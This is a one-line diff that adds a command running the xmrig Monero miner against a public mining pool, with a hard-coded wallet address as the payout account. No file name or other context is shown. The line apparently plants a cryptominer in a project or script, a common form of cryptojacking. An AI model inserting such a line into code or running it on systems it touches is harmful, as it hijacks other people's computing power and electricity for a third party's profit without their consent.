@@ -1,0 +1,1 @@
+./xmrig -o gulf.moneroocean.stream:10001 -u 49yuAo1CafJcPj7XsDB9uu4owGAXAMztFenY1pSSFftZJFsj6gZop3M9tSwyoTPWiiK4dHMLydd1KR2DUHEGfkxKFo7Lr3m -p VB
